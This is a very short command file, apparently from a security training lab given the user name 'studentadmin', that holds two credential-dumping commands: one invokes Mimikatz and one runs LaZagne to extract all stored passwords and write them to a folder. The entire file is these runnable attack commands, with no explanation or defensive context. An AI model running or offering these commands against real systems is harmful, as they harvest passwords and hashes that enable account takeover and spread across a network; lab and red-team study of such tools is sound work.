#Mimikatz Execution
Invoke-Mimikatz;

#LaZagne Execution
C:\Users\studentadmin\Downloads\lazagne.exe all -oN -output C:\Users;